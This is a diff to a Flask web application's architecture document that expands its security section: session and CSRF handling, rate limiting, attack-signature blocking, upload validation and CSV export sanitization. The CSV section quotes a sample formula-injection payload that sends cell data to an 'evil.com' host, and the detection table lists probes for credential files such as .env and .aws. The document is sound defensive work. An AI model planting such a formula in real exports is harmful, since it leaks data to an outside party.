@@ -20,14 +20,25 @@ to replicate the same application architecture in a new project.
 6. [Service Layer](#service-layer)
 7. [Data Storage Model](#data-storage-model)
 8. [Multi-User Isolation](#multi-user-isolation)
-9. [Authentication and Authorization](#authentication-and-authorization)
-10. [Security Middleware](#security-middleware)
-11. [Startup Sequence](#startup-sequence)
-12. [Configuration and Secrets](#configuration-and-secrets)
-13. [Logging](#logging)
-14. [Frontend Design System](#frontend-design-system)
-15. [Key Patterns and Conventions](#key-patterns-and-conventions)
-16. [Local Development Setup](#local-development-setup)
+9. [Security Model](#security-model)
+    - [Layer overview](#layer-overview)
+    - [Authentication and session security](#authentication-and-session-security)
+    - [Authorization decorators](#authorization-decorators)
+    - [CSRF protection](#csrf-protection)
+    - [Request-layer middleware](#request-layer-middleware)
+    - [Attack detection and auto-blocking](#attack-detection-and-auto-blocking)
+    - [File upload security](#file-upload-security)
+    - [CSV injection prevention](#csv-injection-prevention)
+    - [Mass deletion protection](#mass-deletion-protection)
+    - [Input validation and path safety](#input-validation-and-path-safety)
+    - [HTTP response headers](#http-response-headers)
+    - [Secret and credential handling](#secret-and-credential-handling)
+10. [Startup Sequence](#startup-sequence)
+11. [Configuration and Secrets](#configuration-and-secrets)
+12. [Logging](#logging)
+13. [Frontend Design System](#frontend-design-system)
+14. [Key Patterns and Conventions](#key-patterns-and-conventions)
+15. [Local Development Setup](#local-development-setup)
 
 ---
 
@@ -409,52 +420,332 @@ username = request.args.get('username')  # NEVER — attackable
 
 ---
 
-## Authentication and Authorization
+## Security Model
 
-Authentication is session-based. Sessions are invalidated on app restart
-(development config uses `os.urandom(24)` as `SECRET_KEY`; production reads
-from Secrets Manager, keeping sessions valid across restarts).
+Security is implemented in concentric layers. Every layer is independent —
+a bypass at one layer does not grant access through the next.
 
-### Decorators (defined in `app/routes/auth.py`)
+### Layer overview
 
-| Decorator | Effect |
-|-----------|--------|
-| `@login_required` | Redirects unauthenticated requests to `/login` |
-| `@csrf_required` | Validates CSRF token on POST/PUT/PATCH/DELETE requests |
-| `@sync_not_locked` | Returns 503 while S3 sync is in progress |
-| `@disk_space_required` | Returns 507 if disk is below minimum threshold |
-
-Every page route carries `@login_required`. Every state-changing API route
-carries both `@login_required` and `@csrf_required`.
-
-### CSRF flow
-
-1. `generate_csrf_token()` in `app/utils/helpers.py` creates a token stored in
-   the session and injected into every template via a Jinja2 global.
-2. All state-changing JS calls include the token in the request headers:
-   ```javascript
-   headers: { 'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content }
-   ```
-3. `@csrf_required` validates the header value against `session['csrf_token']`.
+```
+Internet
+  │
+  ▼  1. Nginx — SSL/TLS, static file isolation, Nginx-level rate limit
+  │
+  ▼  2. AWS WAF (optional) — managed rule groups, IP reputation, rate limit at CDN edge
+  │
+  ▼  3. Flask before_request — IP blocklist check, attack pattern detection, app-level rate limit
+  │
+  ▼  4. Route decorators — @login_required, @csrf_required, @admin_required
+  │
+  ▼  5. Input validation — username regex, secure_filename, Pillow verify, size cap
+  │
+  ▼  6. Service layer — user_context path confinement, csv_service locking, mass deletion protection
+  │
+  ▼  7. HTTP response headers — X-Frame-Options, nosniff, HSTS, Referrer-Policy, CSP
+```
 
 ---
 
-## Security Middleware
+### Authentication and session security
 
-`app/security.py` installs a `before_request` hook that runs on every request.
+#### Login endpoint (`/login`)
 
-### Layers
+- Credentials validated via `UserManager.verify_password()` (bcrypt password hashes)
+- CSRF token validated on the login form POST itself — no unauthenticated state-change
+- **Brute-force protection:** per-IP login attempt counter tracked by `RateLimiter`.
+  After 10 failed attempts from the same IP within 15 minutes the endpoint returns 429.
+  The counter resets automatically on a successful login.
+- On success: session populated with `logged_in=True`, `username` (canonical lowercase),
+  and `session_created` timestamp; old CSRF token cleared.
+- On logout: `session.clear()` — all session data destroyed.
 
-| Layer | Mechanism |
-|-------|----------|
-| IP blocklist | In-memory + disk-persisted `blocked_ips.json`; auto-expires |
-| Rate limiting | Per-IP sliding window counters (in-memory) |
-| Attack detection | Regex patterns for `.env`, SQL injection, path traversal, RCE probes |
-| Auto-banning | IPs that trigger attack patterns are auto-blocked (configurable duration) |
-| Security headers | Added to every response: `X-Frame-Options`, `X-Content-Type-Options`, `HSTS` |
+#### Session security
 
-Auto-ban thresholds and rate limits are configurable via the admin API
-(`/api/admin/`).
+| Setting | Value |
+|---------|-------|
+| `SESSION_COOKIE_HTTPONLY` | `True` — JS cannot read the cookie |
+| `SESSION_COOKIE_SAMESITE` | `Lax` — blocks cross-site POST |
+| `SESSION_COOKIE_SECURE` | `True` in production (HTTPS only); `False` in development |
+| `PERMANENT_SESSION_LIFETIME` | 24 hours |
+| Session invalidation on restart | Development: `SECRET_KEY` regenerated with `os.urandom(24)` each restart, making all existing sessions invalid. Production: fixed key from Secrets Manager (sessions survive restart). |
+
+#### Post-restart session invalidation
+
+Even in production, sessions created before the last server start are
+invalidated by `login_required`. Every session stores a `session_created`
+Unix timestamp. On each request, the decorator compares it against
+`APP_START_TIME` (set at module import); sessions older than the last
+restart are cleared and the user is redirected to `/login`.
+
+#### Open redirect protection
+
+The post-login `?next=` redirect is validated by `is_safe_url()` which
+checks that the target URL's scheme and host match the current request. Any
+external URL in `?next=` is silently dropped and the user is sent to `/`.
+
+#### Username allow-list
+
+All usernames are validated against a strict regex before any path, S3 key,
+or Secrets Manager name is constructed from them:
+
+```
+^[A-Za-z0-9_\-]{3,32}$
+```
+
+Characters outside this set (slashes, dots, colons, null bytes, shell
+metacharacters) are rejected at login and at every account creation call.
+This prevents both path traversal and S3/AWS resource name injection.
+
+---
+
+### Authorization decorators
+
+All decorators are defined in `app/routes/auth.py`.
+
+| Decorator | Applied to | Effect |
+|-----------|-----------|--------|
+| `@login_required` | All page routes + all API routes | Returns 401 JSON or login redirect if session is absent or pre-restart |
+| `@csrf_required` | All state-changing API routes (POST/PUT/DELETE) | Returns 403 if CSRF token missing or mismatched |
+| `@admin_required` | Admin-only API routes | Returns 403 if `session['username']` is not flagged as admin in `user_preferences.json` |
+| `@sync_not_locked` | Write routes that conflict with S3 sync | Returns 503 while background sync lock is held |
+| `@disk_space_required(min_percent=15)` | Upload and write routes | Returns 507 if free disk falls below 15% |
+| `@require_valid_origin` | (Optional) Sensitive endpoints | Returns 403 if request does not carry CloudFront headers — enforces CDN-only access |
+
+The `admin_required` decorator must always be layered **after** `login_required`:
+```python
+@api_bp.route('/admin/settings', methods=['POST'])
+@login_required
+@csrf_required
+@admin_required
+def update_admin_settings():
+    ...
+```
+
+---
+
+### CSRF protection
+
+1. `generate_csrf_token()` in `app/utils/helpers.py` creates a random token
+   stored in `session['_csrf_token']` and injected into every template as a
+   Jinja2 global and a `<meta name="csrf-token">` tag.
+2. Every state-changing JavaScript call reads the tag and sends the token as a
+   request header:
+   ```javascript
+   headers: { 'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content }
+   ```
+3. `@csrf_required` reads the stored session token and the header/form token
+   and rejects the request with 403 if either is missing or they do not match.
+4. The CSRF token is rotated (cleared) on every successful login so a token
+   captured before login cannot be reused.
+
+---
+
+### Request-layer middleware
+
+`app/security.py` installs hooks via `init_security_middleware(app)`:
+- `app.before_request(security_middleware)` — runs on every request
+- `app.after_request(add_security_headers)` — runs on every response
+
+#### IP blocklist
+
+- Stored in-memory as `{ip: expiration_unix_timestamp}`.
+- Persisted to `instance/blocked_ips.json` so blocks survive app restart.
+- Expired entries are pruned lazily on each check and on a periodic cleanup sweep.
+- Blocked IPs receive `403 Access denied` with no further processing.
+- Admin API (`/api/admin/`) provides endpoints to view, add, and remove blocks.
+
+#### Application-level rate limiting
+
+- **Global:** 600 requests per minute per IP (sliding window). Exceeded → 429.
+  No auto-block — just rejection.
+- **Login endpoint:** 10 failed attempts per IP per 15 minutes → 429. Counter
+  resets on successful login.
+- Implementation: `RateLimiter` tracks per-IP timestamps in memory. A cleanup
+  sweep removes timestamps older than 1 hour every 5 minutes.
+
+#### Real IP extraction
+
+`get_real_ip(request)` reads `X-Forwarded-For` (first entry, set by CloudFront
+or Nginx), then `X-Real-IP`, then `request.remote_addr`. This ensures rate
+limits and blocklist entries target the actual client, not the proxy.
+
+---
+
+### Attack detection and auto-blocking
+
+`security_middleware()` checks every incoming path + query string against a
+compiled list of regex attack signatures:
+
+| Category | Patterns |
+|----------|----------|
+| Config/env probes | `.env`, `.git/`, `.aws/`, `config.php`, `wp-config`, `.htaccess`, `web.config` |
+| CMS scanners | `/phpmyadmin`, `/phpMyAdmin`, `/mysql`, `/dbadmin`, `/wp-admin`, `/wp-login.php`, `/xmlrpc.php`, `/administrator` |
+| Path traversal | `../`, `..\` |
+| SQL injection | `union.*select`, `concat(...)`, `-- ` (comment sequences) |
+
+**On first match:** request rejected with 403; attack attempt count for that IP
+is incremented using a separate `attack_{ip}` key in `RateLimiter`.
+
+**Auto-block:** if an IP triggers ≥ 5 attack patterns within 60 seconds, it is
+auto-blocked via `ip_blocklist.block_ip(ip, duration_hours=1)`. Subsequent
+requests return 403 without further pattern scanning.
+
+> Nginx independently blocks most of these at the vhost level. The
+> application-layer patterns are a secondary defence for requests that bypass
+> or are not yet covered by the Nginx ruleset.
+
+---
+
+### File upload security
+
+All image uploads go through `app/utils/upload_security.py` →
+`validate_uploaded_image(file_storage)` before any byte is written to disk or
+S3.
+
+| Check | Implementation |
+|-------|---------------|
+| Filename sanitization | `werkzeug.utils.secure_filename()` — strips path separators, null bytes, and dangerous characters |
+| Extension allow-list | `{jpg, jpeg, png, gif, webp}` — case-insensitive; `.` prefix stripped before comparison |
+| Server-side size cap | 10 MB per file (`DEFAULT_MAX_BYTES`); also enforced by Flask `MAX_CONTENT_LENGTH = 96 MB` (up to 8 images per request + overhead) |
+| Content validation | `PIL.Image.open(stream).verify()` — rejects truncated, corrupt, and non-image files even if the extension looks correct |
+| Decompression bomb protection | `PIL.Image.DecompressionBombError` caught and rejected |
+| Generated storage filename | Caller always uses a derived name (`{sku}.jpg`, UUID) — the safe_name returned by the validator is never used as the stored key |
+| Stream rewind | Validator rewinds stream to position 0 on success so caller can read or forward bytes without seeking |
+
+The validator raises `UploadValidationError(message, status_code)` on failure.
+`status_code` is 413 for size violations and 400 for everything else. Route
+handlers map this directly to the JSON response.
+
+```python
+from app.utils.upload_security import validate_uploaded_image, UploadValidationError
+
+try:
+    safe_name, ext = validate_uploaded_image(request.files['image'])
+except UploadValidationError as e:
+    return jsonify({'error': str(e)}), e.status_code
+
+stored_filename = f"{sku}.{ext}"   # never use safe_name as the stored key
+```
+
+---
+
+### CSV injection prevention
+
+`app/utils/csv_sanitizer.py` prevents spreadsheet formula injection in
+exported CSV files (WhatNot exports, eBay exports, download CSV).
+
+Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) treat cells
+beginning with `=`, `+`, `-`, `@`, `\t`, or `\r` as formulas. A crafted value
+such as `=HYPERLINK("http://evil.com/steal?q="&A1,"click me")` can exfiltrate
+data or execute commands on the reviewer's machine.
+
+**Prevention:** `sanitize_cell(value)` prefixes any such leading character with
+a single apostrophe (`'`). Spreadsheets render the apostrophe as empty and
+display the literal text; the `csv` module preserves it as-is.
+
+```python
+sanitize_cell("=EVIL()")  →  "'=EVIL()"
+sanitize_cell("+1234")    →  "'+1234"
+sanitize_cell("Normal")   →  "Normal"   # unchanged
+```
+
+`sanitize_row(row_dict)` applies `sanitize_cell` to every string value in a
+row. Used in `main.py` CSV download route and all export builders.
+
+> The application's own `items.csv` is **not** sanitized — the app reads those
+> values back and a prefix would corrupt them. Sanitization is export-only.
+
+---
+
+### Mass deletion protection
+
+`app/utils/mass_deletion_protection.py` provides five independent circuit
+breakers to prevent accidental bulk deletion of images (for example, during an
+S3 orphan cleanup that runs on bad data):
+
+| Circuit breaker | Threshold | Behaviour |
+|----------------|-----------|-----------|
+| Zero-count guard | `total_count == 0` | Always blocks — system reporting zero items is a data error |
+| Percentage cap | > 50% of total images | Block operation |
+| Absolute count cap | > 100 images at once | Block operation |
+| Rapid deletion rate limit | > 3 delete operations in 5 minutes | Block operation |
+| Empty CSV guard | CSV has < 5 items | Block cleanup operations — CSV may be empty or corrupt |
+
+When any check fails the operation raises `ValueError` with a descriptive message.
+The calling service logs the block and returns an error response to the user.
+
+The `@require_deletion_safety` decorator applies checks 1–4 to any function
+that accepts `deletion_count` and `total_count` kwargs. Check 5 is called
+explicitly via `check_csv_health_before_cleanup(comic_count)`.
+
+---
+
+### Input validation and path safety
+
+#### Request input validation
+
+- Every API endpoint validates required fields, types, string lengths, and
+  numeric ranges at entry. Unknown fields are rejected.
+- String length caps are enforced server-side (titles, descriptions, SKUs).
+  Browser-side limits are not trusted.
+
+#### Path confinement
+
+All filesystem paths built from user input go through `user_context.py` helpers
+that resolve the path and assert it remains under the expected user base
+directory:
+
+```python
+base = Path(user_dir).resolve()
+candidate = (base / secure_filename(name)).resolve()
+if base not in candidate.parents and base != candidate:
+    abort(400, 'Invalid path')
+```
+
+`..`, absolute paths, null bytes, and symlinks in user-supplied names are
+rejected before the path is constructed.
+
+#### SQL / template / subprocess safety
+
+| Vector | Control |
+|--------|---------|
+| SQL | No database — not applicable |
+| Jinja2 templates | Autoescape enabled (default); `\|safe` never used on user-controlled data |
+| Subprocess | Not used with user input |
+| `eval` / `exec` / `pickle` | Not used anywhere in the codebase |
+| `yaml.load` | Not used; `yaml.safe_load` is the project standard |
+| XML (eBay API) | `EbayService._sanitize_trading_payload_strings()` escapes bare `&` in all Trading API payloads before sending |
+
+---
+
+### HTTP response headers
+
+`add_security_headers(response)` runs on every response via `after_request`.
+
+| Header | Value | Purpose |
+|--------|-------|---------|
+| `X-Frame-Options` | `SAMEORIGIN` | Prevents clickjacking in iframes on other origins |
+| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing on downloads |
+| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits referrer leakage to cross-origin requests |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS for 1 year (production only, when `SESSION_COOKIE_SECURE=True`) |
+| `Content-Security-Policy` | Set by **Nginx** in production (single source of truth); set by Flask in development only | Restricts script/style/image sources to `'self'` with carve-outs for Google Fonts and AWS S3 |
+
+> CSP is intentionally set only by Nginx in production to avoid double-header
+> conflicts. The browser enforces the most restrictive of multiple CSP headers,
+> which can silently break features when both Flask and Nginx send one.
+
+---
+
+### Secret and credential handling
+
+| Rule | Implementation |
+|------|---------------|
+| No static keys on EC2 | EC2 instance uses IAM instance profile — no `AWS_ACCESS_KEY_ID` on disk |
+| Per-user eBay tokens | Stored in AWS Secrets Manager under `{app_name}/users/{username}/ebay`; never written to CSV, JSON, or logs |
+| Flask `SECRET_KEY` | Read from Secrets Manager in production; random on each dev restart |
+| No logging of secrets | `safe_error_message(exc)` used for all client-facing errors; raw exceptions + tokens never logged |
+| Vault encrypted at rest | All Ansible variables (including secrets) stored in `deployment/group_vars/vault.yml` (AES-256 ansible-vault); never committed in plaintext |
 
 ---
 
@@ -655,12 +946,17 @@ csv_path = f"instance/data/{username}/items.csv"
 
 ### 4 — Image upload security pattern
 
-```python
-from app.utils.upload_security import validate_uploaded_image
-from werkzeug.utils import secure_filename
+See [File upload security](#file-upload-security) for full detail. Summary:
 
-ext = validate_uploaded_image(request.files['image'])  # raises 400/413 on bad input
-filename = f"{sku}.{ext}"  # generated, never user-supplied
+```python
+from app.utils.upload_security import validate_uploaded_image, UploadValidationError
+
+try:
+    safe_name, ext = validate_uploaded_image(request.files['image'])
+except UploadValidationError as e:
+    return jsonify({'error': str(e)}), e.status_code
+
+stored_filename = f"{sku}.{ext}"   # never use safe_name as the stored key
 ```
 
 ### 5 — eBay payload sanitization
